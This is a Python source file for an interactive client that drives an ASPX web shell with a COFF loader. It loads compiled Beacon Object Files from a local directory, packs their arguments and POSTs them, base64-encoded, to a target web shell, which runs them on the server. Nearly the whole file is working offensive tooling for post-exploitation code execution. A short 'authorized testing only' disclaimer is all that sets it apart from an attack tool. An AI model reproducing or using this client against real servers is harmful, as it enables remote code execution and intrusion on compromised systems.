#!/usr/bin/env python3

import os
import sys
import base64
import requests
import argparse
import shlex
from struct import pack, calcsize

# Based on COFFLoader's beacon_generate.py
def bof_pack(fstring: str, args: list):
    buffer = b""
    size = 0

    def addshort(short):
        nonlocal buffer, size
        buffer += pack("<h", int(short))
        size += 2

    def addint(dint):
        nonlocal buffer, size
        buffer += pack("<i", int(dint))
        size += 4

    def addstr(s):
        nonlocal buffer, size
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        buffer += pack(fmt, len(s) + 1, s)
        size += calcsize(fmt)

    def addWstr(s):
        nonlocal buffer, size
        if isinstance(s, str):
            s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        buffer += pack(fmt, len(s) + 2, s)
        size += calcsize(fmt)

    def addbinary(b):
        nonlocal buffer, size
        fmt = "<L{}s".format(len(b) + 1)
        buffer += pack(fmt, len(b) + 1, b)
        size += calcsize(fmt)

    if len(fstring) != len(args):
        raise Exception(
            f"Format string length must match argument count: "
            f"fstring={len(fstring)}, args={len(args)}"
        )

    for i, c in enumerate(fstring):
        if c == "b":
            with open(args[i], "rb") as fd:
                addbinary(fd.read())
        elif c == "c":
            addbinary(args[i])
        elif c == "i":
            addint(args[i])
        elif c == "s":
            addshort(args[i])
        elif c == "z":
            addstr(args[i])
        elif c == "Z":
            addWstr(args[i])
        else:
            bad = "Invalid character in format string: "
            raise Exception(f"{bad}{fstring}\n{(len(bad) + i) * ' '}^")

    return pack("<L", size) + buffer

BEACONS_DIR = "/usr/share/beacons"  # each subdir: name/name.x64.o and name/name.x86.o


def list_beacons():
    if not os.path.isdir(BEACONS_DIR):
        print(f"[!] Beacons directory not found: {BEACONS_DIR}")
        return []
    beacons = []
    for entry in sorted(os.listdir(BEACONS_DIR)):
        path = os.path.join(BEACONS_DIR, entry)
        if os.path.isdir(path):
            x64 = os.path.join(path, f"{entry}.x64.o")
            x86 = os.path.join(path, f"{entry}.x86.o")
            available = []
            if os.path.isfile(x64):
                available.append("x64")
            if os.path.isfile(x86):
                available.append("x86")
            if available:
                beacons.append((entry, available))
    return beacons


def get_beacon_path(name, arch="x64"):
    path = os.path.join(BEACONS_DIR, name, f"{name}.{arch}.o")
    if not os.path.isfile(path):
        return None
    return path

def send_to_server(url, function_name, coff_bytes, packed_args):
    coff_b64    = base64.b64encode(coff_bytes).decode()
    # args -> hex string -> encode to bytes -> base64
    hex_args    = packed_args.hex()
    args_b64    = base64.b64encode(hex_args.encode()).decode()

    payload = {
        "function": function_name,
        "coff":     coff_b64,
        "args":     args_b64,
    }

    try:
        resp = requests.post(url, json=payload, timeout=60)
        return resp.text
    except requests.exceptions.ConnectionError:
        return "[!] Connection error — is the server running?"
    except requests.exceptions.Timeout:
        return "[!] Request timed out."
    except Exception as e:
        return f"[!] Request failed: {e}"

def cmd_help():
    print("""
Client for ASPX Web Shell with COFF Loader
Based on TrustedSec's COFFLoader: https://github.com/trustedsec/COFFLoader/tree/main
Author: Eugenie Potseluevskaya
    
For security research and authorized penetration testing only.
Use strictly on systems you own or have explicit written permission to test.
Unauthorized use is illegal and the author assumes no liability for misuse or damages resulting from this code.
    
Available commands:
  help
      Show this message.

  list
      List available beacons in the beacons directory.

  exec <beacon_name> [format_string [arg1 arg2 ...]]
      Execute a beacon against the server.

      beacon_name   Name of the beacon subdirectory.
      format_string bof_pack format string (b/i/s/z/Z). Omit if no args needed.
      arg1 arg2 ... Arguments matching the format string.

      Examples:
        exec whoami
        exec mybeacon z "hello world"
        exec mybeacon zi "some string" 42
        exec mybeacon zZ "str1" "widestr"

  exit
      Quit the client.
""")


def cmd_list():
    beacons = list_beacons()
    if not beacons:
        print("[*] No beacons found.")
        return
    print(f"\n{'Name':<30} {'Architectures'}")
    print("-" * 45)
    for name, arches in beacons:
        print(f"  {name:<28} {', '.join(arches)}")
    print()


def cmd_exec(url, parts):
    # parts = everything after "exec", already split
    if not parts:
        print("[!] Usage: exec <beacon_name> [format_string [arg1 arg2 ...]]")
        return

    beacon_name = parts[0]
    beacon_path = get_beacon_path(beacon_name, arch="x64")
    if not beacon_path:
        print(f"[!] Beacon '{beacon_name}' not found or missing x64 .o file.")
        return

    # Parse optional format string and args
    if len(parts) >= 2:
        fstring = parts[1]
        args    = parts[2:]
        if len(fstring) != len(args):
            print(f"[!] Format string has {len(fstring)} type(s) but {len(args)} argument(s) provided.")
            return
        try:
            packed_args = bof_pack(fstring, args)
        except Exception as e:
            print(f"[!] Failed to pack arguments: {e}")
            return
    else:
        # No args — send an empty packed buffer
        packed_args = pack("<L", 0)

    with open(beacon_path, "rb") as f:
        coff_bytes = f.read()

    # Entry point is always "go" by BOF convention
    function_name = "go"

    print(f"[*] Sending '{beacon_name}' (x64) to {url} ...")
    output = send_to_server(url, function_name, coff_bytes, packed_args)

    print("\n── Output ──────────────────────────────────────")
    print(output if output.strip() else "(no output)")
    print("────────────────────────────────────────────────\n")

def main():
    parser = argparse.ArgumentParser(description="ASPX Web Shell With COFF Loader Client")
    parser.add_argument("url", help="Target URL, e.g. http://192.168.1.10/bof.aspx")
    args = parser.parse_args()

    url = args.url.rstrip("/")
    print(f"[*] ASPX Web Shell With COFF Loader Client")
    print(f"[*] Target: {url}")
    print(f"[*] Beacons: {os.path.abspath(BEACONS_DIR)}")
    print("[*] Type 'help' for available commands.\n")

    while True:
        try:
            line = input("bof> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            break

        if not line:
            continue

        try:
            parts = shlex.split(line)
        except ValueError as e:
            print(f"[!] Parsing error: {e}")
            continue
        cmd   = parts[0].lower()

        if cmd == "help":
            cmd_help()
        elif cmd == "list":
            cmd_list()
        elif cmd == "exec":
            cmd_exec(url, parts[1:])
        elif cmd == "exit":
            print("[*] Exiting.")
            break
        else:
            print(f"[!] Unknown command: '{cmd}'. Type 'help' for available commands.")


if __name__ == "__main__":
    main()
